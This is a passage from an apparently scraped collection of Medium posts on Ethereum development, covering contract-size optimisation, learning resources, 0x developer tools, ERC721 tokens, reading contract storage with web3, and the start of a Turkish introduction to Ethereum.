"https://medium.com/daox/avoiding-out-of-gas-error-in-large-ethereum-smart-contracts-18961b1fc0c6?source=search_post", "post_date": "May 3, 2018", "readtime": "7 min read", "upvotes": "710", "content": "Avoiding out-of-gas error in large Ethereum smart contractsKirill BulgakovBlockedUnblockFollowFollowingMay 3, 2018Nowadays, more and more apps and instruments utilize blockchain technology and Ethereum smart contracts. The more complex the business logic behind the smart contract is, the more gas it takes to deploy it to the network. This is due to the fact that when the size of the source code increases, the size of the contract\u2019s bytecode increases as well. Uploading a large amount of bytecode requires a lot of gas. At this time, there is a limitation of about 8 million gas limit per block on the Ethereum blockchain. It means that the total amount of gas for all the transactions in a block including contract deploy cannot exceed this number.This article will describe several methods that could be used to place large smart contracts on the Ethereum blockchain.What is a\u00a0bytecodeSmart contracts cannot function without the Ethereum Virtual Machine. EVM is a runtime environment for executing smart contracts based on Ethereum. The Virtual Machine does not work directly with the Solidity code, it works with the bytecode. The bytecode is a set of instructions for the Virtual Machine, that has strict technical specification described in the Ethereum Yellow Paper\u00a0. Any smart contract written in Solidity (or any other language for the EVM) is first compiled to the bytecode that will be executed by the Virtual Machine later on.Let us take a look at a small contract and its bytecode:contract Example {    mapping(uint => bool) public map;        function setValue(uint key, bool value) {        map[key] = value;    }}Bytecode of the Example\u00a0contractAs you might notice, a large amount of bytecode is generated even for a couple lines of a simple code. An issue stated above (block gas limit exceeded) can take place when your contracts become more complex or start to use other contracts.Let us have a look at some methods that could be of help here.LibrariesCode reuse through librariesA Library is a special type of contract with some limitations. For example, a library cannot receive Ether and does not have its own storage.Despite some limitations, a library can be used to reduce the bytecode size of the main contract. A library is uploaded to the Ethereum network just once, and then it can be used by several contracts that require this functionality. Thus, you can move various functions to the library in order to reuse the code efficiently. In so doing, you reduce error probability as well as reduce the size of bytecode in the contract that calls the code. This result achieves due to call low-level function which will be described below.Using signatures to call functionsLow-level function: callIn addition to common language structures, Solidity supports low-level commands as well. One of such commands is call that is used to send message calls to other contracts. An advantage of this approach is that a smart contract does not have to store the bytecode of the called function. This approach can prove to be especially relevant if the bytecode of the called method is too big. As a result, the compiled smart contract will not have any extra opcodes, that in turn will reduce its size. However, please notice that it is not possible to get the return value of the function when the call command is used.The syntax of the call function looks as follows:address.call(bytes4(keccak256(<function signature>)), arguments);In other words, the first argument should be the first 4 bytes of the hash of the called function signature. It is crucial to consider the following when writing the function signature:For any size of the uint type (uint8, uint16, etc.) it is necessary to use uint256 in the signature;When being listed, the arguments should be separated by commas, but with no spaces!Transmission of dynamically sized types, for instance strings or arrays, will not function correctly;For example, if a contract has the function function test(uint a, uint b), the correct call of such a function will look as follows: address.call(bytes4(keccak256(\u201ctest(uint256,uint256)\u201d)), a, b);In case the test executing was successful, you will get true, but if an error occurred you will get false. So don\u2019t forget to use require for handling error purposes.Using interfacesThe same result can be achieved by means of interfaces.An Interface is a special type of contract, limited to what the Contract ABI can represent. Put it in other way, it is possible to describe the function signature in the interface, but not the implementation. Using interfaces is convenient for a couple of reasons:The code readability improves, as compared to the explicit usage of call;You can handle the return value;The use of an interface can be shown with the following example:interface ICallee {    function makeCall(uint val) returns(uint);}contract Caller {    ICallee public callee;        function call() {        callee.makeCall(42);    }}The Caller contract knows the interface of the ICallee contract, that is why its bytecode will have hash of signature of the makeCall function:\u00a0\u202616637e839a3c602a\u2026So, it becomes possible to use a function from another contract without storing its bytecode in the called contract.Code decompositionCode decomposition through librariesCode reuse is not the sole purpose of a library. For instance, in Daox smart contracts ecosystem CrowdsaleDAO Factory uses the library to split bytecode into two contracts. To avoid uploading the bytecode of the CrowdsaleDAO contract along with the bytecode of the CrowdsaleDAO Factory contract we moved the process of its creation into a separate light-weighted DAODeployer library, which is uploaded independently from the factory:contract CrowdsaleDAOFactory is DAOFactoryInterface {    function createCrowdsaleDAO(string _name, string _description) public {        address dao = DAODeployer.deployCrowdsaleDAO(_name, _description);         DAODeployer.transferOwnership(dao, msg.sender);    }}library DAODeployer {    function deployCrowdsaleDAO(string _name,  string _description)    returns(CrowdsaleDAO dao) {        dao = new CrowdsaleDAO(_name, _description);    }    function transferOwnership(address _dao, address _newOwner) {        CrowdsaleDAO(_dao).transferOwnership(_newOwner);    }}The following two images show how effective this method is:The difference between two methods is more than 5\u00a0timesThe factory on the left does not use the DAODeployer library, while the one on the right does. Thus, a slight increase in the functionality of the factory or CrowdsaleDAO will make the block gas limit sufficient for uploading the factory to the network without any additional optimization.Decomposing the code into contractsSolidity supports inheritance with the is keyword. As Solidity documentation says: \u201cWhen a contract inherits from multiple contracts, only a single contract is created on the blockchain, and the code from all the base contracts is copied into the created contract.\u201d Consequently, if parent contracts have large bytecode, the result contract is very probable to exceed gas limit of the block. In order to avoid a problem one can decompose the code into several contracts, and use delegatecall after that.delegatecall is another low-level method that is very similar to call.Its main difference from call is that when using delegatecall the state of the storage gets fully copied from the calling contract into the called contract. At the same time, the msg.sender and msg.value variables do not change. This method can be used when reusing the code that implies change of the storage. Let us consider how effective this method is on the following example:The ecosystem of Daox smart contracts has several types of voting, each with almost identical functionality. When using inheritance through the is keyword, the bytecode size gets too large, that is why this option is not suitable.In order to reduce the amount of opcodes of the contract it was decided to use delegatecall. As can be seen from the diagram above (fig. 1), three types of voting use a common codebase through a delegate call to the Voting contract. Please notice, that all three voting types are inherited from the VotingFields parent contract. This allows for having the same feature set, which in turn ensures the correct operation of such pseudo-inheritance.SummarySolidity has several architectural solutions for excessive block gas limit.If you call a small number of functions from the external contract, interfaces or call() will work for you, as there is no need to store the bytecode of other unused functions;When several contracts use one functionality that does not change the storage, libraries would be an ideal option;If an access to the storage variables is needed, you can resort to the code decomposition, using delegatecall();Please note that this list is not complete, but these turned out to be the most effective optimization.", "responses": "3"}, {"title": "Resources I Used to Teach Myself Blockchain Development", "author_name": "Gwendolyn Faraday", "link": "https://medium.freecodecamp.org/the-resources-i-used-to-teach-myself-blockchain-development-1fccada9b92b?source=search_post", "post_date": "Aug 9, 2018", "readtime": "5 min read", "upvotes": "807", "content": "Resources I Used to Teach Myself Blockchain DevelopmentGwendolyn FaradayBlockedUnblockFollowFollowingAug 9, 2018I started investing in cryptocurrencies last year, and just kept going down the blockchain rabbit hole from there. Where I live especially, much of the blockchain community is focused on things like trading and investing in cryptocurrencies. Although it was fun to invest at first, I wasn\u2019t so interested in that. So I started my own local meetup group to focus on blockchain development.The meetup group allowed me to connect and learn alongside members of the community, and I\u2019ve used that to compile a list of resources that I, and the other members, have found useful. These resources are arranged from the most basic blockchain explanations to the underlying systems as well as building applications on top of the blockchain.There is a lot of noise out there. I hope this helps you make sense of it all if you are interested in becoming a blockchain professional.Table of Contents:Learn the basicsDapp Development with EthereumGame TheoryCryptographyAudio/Supplementary MaterialsOther Types of Blockchain DevelopmentResearchThe Basics\u200a\u2014\u200aHow Blockchain Technologies WorkIt can take a minute to wrap your head around the complexities of blockchain technologies. This technology encompasses so many different fields: computer science, game theory, cryptography, and economics just to name a few. Thus it\u2019s difficult to initially learn the ins and outs of how it all works.Here are a few resources that I think give a good, clear overview of how blockchain really works.Start with this video breaking down how it works:2. Watch both videos here (there is some overlap with the prior resource, but it will cement the concepts in your mind) and play around with the demo on the site:Blockchain DemoA live blockchain demo in a browser.anders.com3. Read the Chapter \u201cWhat is Ethereum\u201d from the GitHub book, \u201cMastering Ethereum\u201dDapp Development with\u00a0EthereumThere are many different blockchains now that allow you to create applications and smart contracts. Ethereum is by far the most popular option, with Solidity being its dominant programming language. I suggest trying out building dapps with these technologies first.By far the best way to learn to code with Solidity is Cryptozombies. It\u2019s an interactive coding environment that teaches you how to program Solidity step by step while building a zombie game! It\u2019s kept up to date with new versions of Solidity too, which is hard to come by in the ever-changing blockchain space.If you want something in addition to Cryptozombies, here are two other recommendations I have for learning solidity:Youtube video series for dapp development\u200a\u2014\u200aThis channel explains things very well, but the syntax isn\u2019t totally up to date so you might have to google some things if you are getting errors. The Remix editor he uses will give you hints about what you need to change, so you should be fine.Stephen Grider on Udemy\u200a\u2014\u200athis is a paid course, but you can get a deal for ~$9.99 USD and it has good examples and content.After you finish Cryptozombies, it\u2019s a good idea to learn how to use the Remix IDE for creating, debugging, and deploying contracts. The docs have a quick start and lots of step-by-step instructions with screenshots to get you going.You should also learn about Ethereum clients and wallets. Those links will explain everything you need to know. Metamask is a browser plugin and a great way to get started (it\u2019s for Chrome or Firefox, but the Chrome one seems to work much better).Next, learn more advanced smart contract development. Start by reading the Solidity documentation. It goes into more advanced concepts and has some good example dapps, too. Ethereum.org also had some good dapp examples to look through like this one. You can copy the examples straight into the Remix IDE and test them out for yourself.After you have a good grasp on Solidity and smart contracts, start looking through some open source examples. The default go-to seems to be Crypto Kitties (you can see the contract code at any Ethereum address at etherscan.io), but there are many more that can be great learning tools. You can search GitHub and Etherscan to find more.There is a lot of development going on in the Ethereum space around developer tools and security. Here are some awesome libraries and tools along those lines that you can check out:Open ZeppelinTruffle Development FrameworkConsenSys\u200a\u2014\u200aSmart Contract Best PracticesGame TheorySome of the problems that blockchain aims to solve are from game theory, most notably The Byzantine Generals Problem. This problem deals with consensus between many different parties without having to trust that any individual is not malicious.The Great Courses Plus offers an excellent lecture series on various topics in game theory. They have a monthly subscription model with a two-week free trial. The 24 30-minute lectures cover a broad range of topics in game theory, and I think it\u2019s great for an overall understanding of the subject.CryptographyI am definitely not an expert here, but I am continuously learning about how cryptography works and how it can be applied to blockchain. This area does get really deep into the math, as Ethereum and many other blockchains use Eliptical Curve Cryptography.As a noob in this space, here are some resources I have found useful:Coursera Cryptography I\u200a\u2014\u200aFree to audit the course; paid if you want a certificate.Chapter on Cryptography in the Ethereum Mastery bookAudio Supplementary MaterialPodcast: Software Engineering Daily, Blockchain\u200a\u2014\u200aThis is my favorite blockchain podcast. They do a very good job at explaining complex topics and have a variety of industry leaders on the show.Podcast: CryptoDisrupted\u200a\u2014\u200aThe host brings in a lot of guests from interesting projects in the blockchain space. I\u2019ve enjoyed most of what I\u2019ve listened to with this podcast.Other Types of Blockchain DevelopmentThe Ethereum community has, by far, the most developers and learning resources, so it\u2019s a good place to get started with blockchain development. I think you would be remiss if you did not explore other innovation in the space, however. Below are some interesting projects.Lisk\u200a\u2014\u200aMakes blockchain development more accessible, as everything is built in JavaScript.EOS\u200a\u2014\u200aThe creator, Dan Larimer, had built several other successful blockchain solutions before starting this project. EOS is supposed to solve some of the problems with Ethereum, like scaling and security. It\u2019s sometimes called, \u201cThe Ethereum Killer\u201d.Interchain Protocols\u200a\u2014\u200aThese are some solutions that help facilitate transactions between different blockchains and also have interesting solutions to help blockchain scale:CosmosPolkadotInterledgerHyperledger\u200a\u2014\u200aAn open source collaborative effort created to advance cross-industry blockchain technologies. It\u2019s hosted by The Linux Foundation.Holo\u200a\u2014\u200aA post-blockchain technology that attempts to solve the issues of scalability and centralization in today\u2019s blockchain technologies.Research & Current DevelopmentOnce you learn the basics, it\u2019s so important to read research papers to achieve mastery in the blockchain space. Here are some places where I have had success:The Morning Paper\u200a\u2014\u200aBlockchain ArticlesCollection of whitepapers from ICOshttp://blockchain.mit.edu/https://www.blockchainresearchinstitute.org/ConclusionI will be continuously studying blockchain development and trying to find new and interesting solutions. Please leave a comment or message me if I am missing anything here.Right now, I am planning more articles about companies, projects, and people of interest in the blockchain space. Follow me if you are interested in any of these things.", "responses": "9"}, {"title": "New Ethereum Dev Tools from\u00a00x", "author_name": "Leonid Logvinov", "link": "https://blog.0xproject.com/new-ethereum-dev-tools-from-0x-db80ee9e802?source=search_post", "post_date": "Jan 17", "readtime": "4 min read", "upvotes": "1.9K", "content": "New Ethereum Dev Tools from\u00a00xFour tools to help you write better smart contractsLeonid LogvinovBlockedUnblockFollowFollowingJan 17Today we\u2019re releasing four new tools to help Ethereum developers working on smart contracts. We\u2019re excited to finally release these tools publicly, as we have been using them for a while internally at 0x and have shared them with a few other projects in the community.Check out sol-compiler, sol-trace, sol-coverage, and sol-profiler to get started!Ethereum toolingAt 0x, we embrace the UNIX tools philosophy: \u201ceach tool should only do one thing, and one thing well.\u201d When we started building 0x protocol, Truffle was the de-facto framework for projects. It worked reasonably well and we\u2019re glad that it helped us get started. However, as we grew, our requirements evolved and we kept pushing the boundaries of what was possible with the framework. Truffle is the Ruby-on-rails of Solidity development and we found it hard to extend it in unintended ways. That\u2019s why we decided to build a set of modular tools that can be combined together and used by others. None of the tools we are releasing today are 0x-specific. You can start using them in your project independently of your current stack (even with Truffle projects!).By evaluating the existing toolset and breaking up our workflow into logical pieces, we\u2019ve realized that Ethereum development consists of two main stages. Compiling contracts into artifacts and then doing stuff with those artifacts (e.g running tests, debugging, verifying or analyzing metrics, etc\u2026). Unfortunately, there is no single artifact format used by all tools. Some that have reasonable adoption are Truffle\u2019s artifacts and Solidity\u2019s standard JSON output (SSJO from now on). Truffle artifacts include a lot of compiler metadata that we never used and were missing other pertinent pieces of data. Unfortunately, there is no way to customize what compiler metadata is included by Truffle. At the same time, the SSJO format is configurable and can contain only the parts you want.Want just the ABI? you got it! Need source maps, bytecode, and AST for your fancy debugger? We got you. And it\u2019s what the compiler already outputs\u200a\u2014\u200aso why reinvent the wheel? The only problem is that SSJO is based around compilation units. One compilation unit could contain multiple smart contracts. We found it more convenient to work with artifacts that correspond 1\u20131 with a single contract (and it\u2019s dependencies). So, the artifact format we use is heavily inspired by SSJO and contains SSJO sections, but only the sections related to a specific smart contract. Additionally, it also includes some additional information such as deploys by the network.The good news is that you don\u2019t need to adopt our artifact format in order to use three of our tools! Check out this Truffle example project that uses 3 of the tools.@0x/sol-compilerSol-compiler is a wrapper around the Solidity compiler that makes it easier to compile entire projects. It produces the artifacts that can be used by all the other tools with zero configuration. Learn more here. I\u2019ll just tease you with the fact that it\u2019s the only solidity compiler I\u2019m aware of that has \u201cwatch mode\u201d.@0x/sol-traceI\u2019m sure some of you will be familiar with this error message: Error: VM Exception while processing transaction: revert. Instead of that error, you can now get nice stack-trace like in all other modern languages.@0x/sol-coverageIf it\u2019s not tested, it\u2019s broken. And how do you know if you\u2019ve tested it? By measuring code coverage with sol-coverage.@0x/sol-profilerGas is money. Both your money and your user\u2019s money. So why not spend it efficiently and be aware of the bottlenecks and optimization opportunities? Sol-profiler lets you do just that.The last three tools need to have some information about your smart contracts to work. They can either retrieve this information from truffle artifacts, @0x/sol-compiler artifacts, or from any other source with the help of a small and customizable adapter. Check out any of the docs for more info.Nitty gritty technical detailsSome of you might be interested to know how these tools work, especially the revert traces since all of these tools are trace-based. Each tool is written as a subprovider that you inject into your provider stack. It then eavesdrops on all your transaction calls and gas estimate requests. When a transaction executes, it fetches it\u2019s trace and uses the source maps to map the data back to lines of Solidity source code or assembly. The traces also contain gas information which is used by the profiler. If you simply ignore the gas information, you end up with code coverage (i.e which lines of the source were executed?).\u00a0\u00a0We have abstracted away most of the technical complexity so that developers can easily use these tools without knowing how they work under-the-hood. Contributions are always welcome and we hope you find these tools useful!", "responses": "1"}, {"title": "The Anatomy of\u00a0ERC721", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/the-anatomy-of-erc721-2576e40bfc5b?source=search_post", "post_date": "Dec 23, 2017", "readtime": "8 min read", "upvotes": "789", "content": "The Anatomy of\u00a0ERC721Understanding Non-Fungible Ethereum\u00a0TokensSteven McKieBlockedUnblockFollowFollowingDec 23, 2017Crosspost: This post was originally written and published by Gerald Nash, here. It was reposted to BlockChannel with his permission.Many have heard of the new game on the Ethereum blockchain called CryptoKitties. The new game recently made several headlines within the cryptocurrency community because of its extremely unique idea and the dent it\u2019s made on the Ethereum network. CryptoKitties is a game in which players can buy, sell, trade, and breed digital cats. They can be thought of as \u201cbreedable Beanie Babies\u201d in that each cat is unique in some way. This uniqueness makes the CryptoKitties extremely collectible, as someone could take interest in the characteristics of several kittens and wish to own many of them.Source: Vice\u00a0MediaBut collectibles aren\u2019t limited to digital felines. Humans have always had a history of collecting things; it\u2019s nothing new. From physical coins to Pok\u00e9mon cards, people love collecting. It\u2019s a hobby that forms as a result of a unique interest in scarce items. Similar to how the value of a commodity is related to its scarcity, the value of a collectible item to a collector is connected to its rareness among other items.We can emulate rare, collectible items with Ethereum tokens, and each of these tokens follows a novel standard in the Ethereum community known as ERC721. Ethereum Request for Comments 721, or ERC721, is an Ethereum Improvement Proposal introduced by Dieter Shirley in late 2017. It\u2019s a proposed* standard that would allow smart contracts to operate as tradeable tokens similar to ERC20. ERC721 tokens are unique in that the tokens arenon-fungible.ERC: Non-fungible Token Standard \u00b7 Issue #721 \u00b7 ethereum/EIPsLatest draft. For context, the original draft is included at the bottom of this post hidden in the \u201cOriginal Draft\u2026github.com", "responses": "2"}, {"title": "How to read Ethereum contract\u00a0storage", "author_name": "Darius", "link": "https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925?source=search_post", "post_date": "Sep 14, 2017", "readtime": "3 min read", "upvotes": "845", "content": "How to read Ethereum contract\u00a0storageDariusBlockedUnblockFollowFollowingSep 14, 2017Everybody is talking that data in contracts are public, but not everybody knows how to read it.All contracts deployed to ethereum VM has dedicated storage where stores state. Here is an example how to read this storage with the web3.js library using eth.getStorageAt() method.Contract example which we examine:This contract is deployed in ropsten test net: at 0xf1f5896ace3a78c347eb7eab503450bc93bd0c3bAll parameters in the storage are indexed from the beginning. One index takes 256 bytes ant it fits 64 symbols. In this example, we have 10 parameters and we can iterate them:let contractAddress = '0xf1f5896ace3a78c347eb7eab503450bc93bd0c3b'for (index = 0; index < 10; index++){ console.log(`[${index}]` +    web3.eth.getStorageAt(contractAddress, index))}result:[0] 0x000000000000000000000000000000000000000000000000000000000000000f[1] 0x00000000000000000000000059b92d9a0000000000000000000000000000429f[2] 0x0000000000000000000000000000000074657374310000000000000000000000[3] 0x7465737431323336000000000000000000000000000000000000000000000000[4] 0x6c65747320737472696e6720736f6d657468696e67000000000000000000002a[5] 0x0000000000000000000000000000000000000000000000000000000000000000[6] 0x0000000000000000000000000000000000000000000000000000000000000000[7] 0x0000000000000000000000000000000000000000000000000000000000000002[8] 0x0000000000000000000000000000000000000000000000000000000000000002[9] 0x0000000000000000000000000000000000000000000000000000000000000000Let`s have a deeper look into each parameterIndex 0\u200a\u2014\u200astoreduint1let contractAddress = '0xf1f5896ace3a78c347eb7eab503450bc93bd0c3b'let index = 0console.log(web3.eth.getStorageAt(contractAddress, index))console.log('DEC:' + web3.toDecimal(web3.eth.getStorageAt(contractAddress, index)))result:0x000000000000000000000000000000000000000000000000000000000000000fDEC:15constuintConstants are not stored in a storage. Available only in code.Index 1\u200a\u2014\u200ainvestmentsLimit, investmentsDeadlineTimeStamplet index = 1console.log(web3.eth.getStorageAt(contractAddress, index))result: 0x00000000000000000000000059b92d9a0000000000000000000000000000429fDEC:  1505308058   and  17055In index 1 is merged 2 properties to optimize storage usage.index 2\u200a\u2014\u200astring1index = 2console.log(web3.eth.getStorageAt(contractAddress, index))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, index)))result: 0x0000000000000000000000000000000074657374310000000000000000000000ASCII: test1index 3\u200a\u2014\u200astring2index = 3console.log(web3.eth.getStorageAt(contractAddress, index))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, index)))result:0x7465737431323336000000000000000000000000000000000000000000000000ASCII: test1236index 4\u2014\u00a0string3index = 4console.log(web3.eth.getStorageAt(contractAddress, index))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, index)))result:0x6c65747320737472696e6720736f6d657468696e67000000000000000000002aASCII: lets string something         * (42)End symbol 2a (dec 42) is length of the stored string. (more details http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage)index 5\u200a\u2014\u200auints1index = 5console.log(web3.eth.getStorageAt(contractAddress, index))result:0x0000000000000000000000000000000000000000000000000000000000000000PROBLEM!!!!Mappings have a different indexation and should be read in other way. To read mapping value you should know the key value. Otherwise, read mapping value is impossible.index = '0000000000000000000000000000000000000000000000000000000000000005'key =  '00000000000000000000000xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6'let newKey =  web3.sha3(key + index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('DEC: ' + web3.toDecimal(web3.eth.getStorageAt(contractAddress, newKey)))result:0x0000000000000000000000000000000000000000000000000000000000000058DEC: 88index6\u200a\u2014\u200astructs1index = \"0000000000000000000000000000000000000000000000000000000000000006\"key =  \"00000000000000000000000xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6\"let newKey =  web3.sha3(key + index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963654272616e64000000000000000000000000000000000000000016ASCII: deviceBrandTo read second struct value you need to increase newKey value by 1function increaseHexByOne(hex) { let x = new BigNumber(hex) let sum = x.add(1) let result = '0x' + sum.toString(16) return result}index = \"0000000000000000000000000000000000000000000000000000000000000006\"key =  \"00000000000000000000000xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6\"let newKey =  increaseHexByOne(  web3.sha3(key + index, {\"encoding\":\"hex\"}))console.log(web3.eth.getStorageAt(contractAddress,newKey))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963655965617200000000000000000000000000000000000000000014ASCII: deviceYearIf you want third struct value increase newKey once more.index 7\u2014 uintarrayindex = \"7\"console.log(web3.eth.getStorageAt(contractAddress, index))result:  0x0000000000000000000000000000000000000000000000000000000000000002This array has 2 itemsindex = \"0000000000000000000000000000000000000000000000000000000000000007\"let newKey = web3.sha3(index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('DEC: ' +  web3.toDecimal(web3.eth.getStorageAt(contractAddress, newKey)))result:0x0000000000000000000000000000000000000000000000000000000000001f40DEC: 8000newKey = increaseHexByOne(web3.sha3(index, {\"encoding\":\"hex\"}))console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('DEC: ' +  web3.toDecimal(web3.eth.getStorageAt(contractAddress, newKey)))result:0x0000000000000000000000000000000000000000000000000000000000002328DEC: 9000index 8\u2014 deviceDataArrayindex = \"0000000000000000000000000000000000000000000000000000000000000008\"let newKey = web3.sha3(index, {\"encoding\":\"hex\"})console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('ASCII: ' + web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963654272616e64000000000000000000000000000000000000000016ASCII: deviceBrandindex = \"0000000000000000000000000000000000000000000000000000000000000008\"let newKey = increaseHexByOne(web3.sha3(index, {\"encoding\":\"hex\"}))console.log(web3.eth.getStorageAt(contractAddress, newKey))console.log('ASCII: ' +web3.toAscii(web3.eth.getStorageAt(contractAddress, newKey)))result:0x6465766963655965617200000000000000000000000000000000000000000014ASCII: deviceYearIncrease by 2 result:0x776561724c6576656c0000000000000000000000000000000000000000000012ASCII: wearLevelIncrease by 3 you enter to second item into array result:0x6465766963654272616e64320000000000000000000000000000000000000018ASCII: deviceBrand2Sources:https://github.com/ethereum/solidity/issues/1550https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_getstorageathttps://ethereum.stackexchange.com/questions/13910/how-to-read-a-private-variable-from-a-contracthttps://github.com/ethereum/web3.js/issues/445Check out our testing ground\u200a\u2014\u200aAigang!More about Aigang\u200a\u2014\u200ahttp://bit.ly/AigangWebsiteAigang Whitepaper\u200a\u2014\u200ahttp://bit.ly/2hwAtktAigang on Telegram\u200a\u2014\u200ahttp://bit.ly/AigangTelegramGet Aigang Latest Updates\u200a\u2014\u200ahttp://bit.ly/AigangUpdates", "responses": "11"}, {"title": "Nedir yahu \u015fu Ethereum?", "author_name": "Mert Susur", "link": "https://medium.com/codefiction/nedir-yahu-%C5%9Fu-ethereum-f545aad58910?source=search_post", "post_date": "Aug 13, 2017", "readtime": "8 min read", "upvotes": "537", "content": "Nedir yahu \u015fu Ethereum?Mert SusurBlockedUnblockFollowFollowingAug 13, 2017Ethereum hakk\u0131nda bir s\u00fcredir f\u0131rsat bulduk\u00e7a yay\u0131nlarda konu\u015fmaya \u00e7al\u0131\u015ft\u0131k (28. B\u00f6l\u00fcm Daha \u00e7ok AWS Lambda ve daha \u00e7ok Ethereum) ve hatta Solidity dili hakk\u0131nda giri\u015f seviyesinde bir kay\u0131t da payla\u015fm\u0131\u015ft\u0131k (Solidity 101). \u015eimdi de Ethereum\u2019un nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131ndan ve DApps (Decentralized Applications) kavram\u0131ndan bahsetmek istiyorum.\u00d6ncelikle Ethereum ayn\u0131 Bitcoin gibi bir blockchain (blok zincir) teknolojisi. Bir \u00e7ok y\u00f6n\u00fcyle Bitcoin\u2019e benziyor ancak biraz daha fazlas\u0131. Bu y\u00fczden Ethereum konu\u015fmaya ba\u015flamadan \u00f6nce belki de Bitcoin\u2019den ve nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131ndan bahsetmek daha do\u011fru olacakt\u0131r.Bitcoin nedir?2008 y\u0131l\u0131ndaki k\u00fcresel mali kriz ile birlikte Satoshi Nakamoto ad\u0131nda bir ki\u015fi Ekim ay\u0131nda Crypto Mail gruplar\u0131ndan bir tanesinde bir makale payla\u015farak Bitcoin ad\u0131nda dijital bir para biriminden bahsetti. (Bitcoin: A Peer-to-Peer Electronic Cash System). Satoshi Nakamoto\u2019nun ger\u00e7ek bir isim olup olmad\u0131\u011f\u0131n\u0131 hala daha bilmiyoruz, \u00e7\u00fcnk\u00fc kendisini tan\u0131yan yok. Ancak daha sonra ayn\u0131 isimle 9 Ocak 2009 tarihinde sourceforce \u00fczerinden ilk \u00e7al\u0131\u015fan istemcisini ve para birimini de yay\u0131nlad\u0131ktan sonra Bitcoin hayata ge\u00e7mi\u015f oldu. K\u0131sa bir zaman i\u00e7erisinde arkas\u0131ndaki ideoloji sayesinde kabullenildi ve \u015fu s\u0131ralarda 4000 dolar seviyesinde seyretmekte.Nakamoto\u2019nun yay\u0131nlad\u0131\u011f\u0131 makalenin ilk paragraf\u0131ndan al\u0131nt\u0131 yaparak \u00e7\u00f6zmeye \u00e7al\u0131\u015ft\u0131\u011f\u0131 sorunu \u00f6zetlemek en do\u011frusu olacakt\u0131r;Internet \u00fczerindeki ticari i\u015flemlerin neredeyse tamam\u0131 g\u00fcvenilir bir otorite olarak hizmet veren \u00fc\u00e7\u00fcnc\u00fc \u015fah\u0131s finans kurumlar\u0131na g\u00fcvenerek \u00e7al\u0131\u015fmaktad\u0131r. Her ne kadar bu sistem bir \u00e7ok i\u015flem i\u00e7in g\u00fczel \u00e7al\u0131\u015f\u0131yor olsa da hala daha g\u00fcvene dayal\u0131 bir sistemin zafiyetlerini de bar\u0131nd\u0131rmaktad\u0131r.Peki nedir bu g\u00fcvene dayal\u0131 sistemlerin zafiyetleri? \u00d6rne\u011fin 2008 mali krizini ele alal\u0131m. Alal\u0131m da bir finans uzman\u0131 olmad\u0131\u011f\u0131m i\u00e7in al\u0131nt\u0131 yaparak anlatmaya \u00e7al\u0131\u015faca\u011f\u0131m.\u2026 ABD bankalar\u0131n\u0131n kar i\u015ftah\u0131 o kadar artm\u0131\u015ft\u0131 ki krediler, kredi derecelendirme s\u00fcrecinde riskleri \u00f6l\u00e7meden umars\u0131zca verildi. Verilen kredilerin b\u00fcy\u00fck bir k\u0131sm\u0131 konut kredisi olarak verildi\u011fi i\u00e7in kredi kullananlar kredileri \u00f6demese bile s\u00fcrekli art\u0131\u015f g\u00f6steren konut fiyatlar\u0131 vard\u0131. Ve en k\u00f6t\u00fc ihtimal bankalar bu evleri sat\u0131p belki kar bile ederek konuyu kapat\u0131rlard\u0131. Bununla birlikte artan bu kredi patlamas\u0131n\u0131n sonucu olarak bankalar kaynak bulmakta g\u00fc\u00e7l\u00fck \u00e7ekiyordu. Bunun da bir \u00e7\u00f6z\u00fcm\u00fc vard\u0131 elbette. Bankan\u0131n ipotek etti\u011fi bu evleri, varl\u0131k teminatl\u0131 menkul k\u0131ymetle\u015ftirerek piyasada doland\u0131racak, kendilerine vadesi \u00e7ok da uzun olmasa bile kaynak yaratm\u0131\u015f olacaklard\u0131. Fakat d\u00fc\u015f\u00fcnmedikleri bir\u015fey vard\u0131: Konut fiyatlar\u0131 ya d\u00fc\u015ferse? Nitekim kredi alanlar kredilerin b\u00fcy\u00fck bir k\u0131sm\u0131 \u00f6denemeyince bankalar konutlara el koymu\u015f, ama 3 birim kredi verdikleri evin de\u011feri 1 birime d\u00fc\u015fm\u00fc\u015ft\u00fc. Bankac\u0131l\u0131k sekt\u00f6r\u00fc bunlardan etkilenmi\u015f, sigortac\u0131l\u0131k sekt\u00f6r\u00fc de bu \u00e7\u0131kar\u0131lan varl\u0131k teminatl\u0131 menkul k\u0131ymetleri sigortalad\u0131klar\u0131 i\u00e7in \u00e7ok ciddi zararlar vermi\u015fti\u2026Daha fazlas\u0131 i\u00e7in\u00a0: http://www.bireyselyatirimci.com/2008-krizi-ve-gercek-nedenleri/\u015eu anda internet \u00fczerinden bir al\u0131\u015fveri\u015f yapmak istedi\u011finizde, kiran\u0131z\u0131 \u00f6demek istedi\u011finizde ya da \u00e7o\u011fu zaman market al\u0131\u015fveri\u015finizi yaparken bankalar\u0131 yani yukar\u0131da bahsedilen \u00fc\u00e7\u00fcnc\u00fc \u015fah\u0131s finansal kurumlar\u0131 kullan\u0131yorsunuz. Bu firmalar devletler taraf\u0131ndan reg\u00fclasyonlarla denetlendi\u011fi i\u00e7in g\u00fcvenilir olarak kabul ediyoruz. Hatta devletler kendileri denetlemelerden sorumlu olduklar\u0131 i\u00e7in bir \u00e7ok i\u015flemin bu kurumlar \u00fczerinden 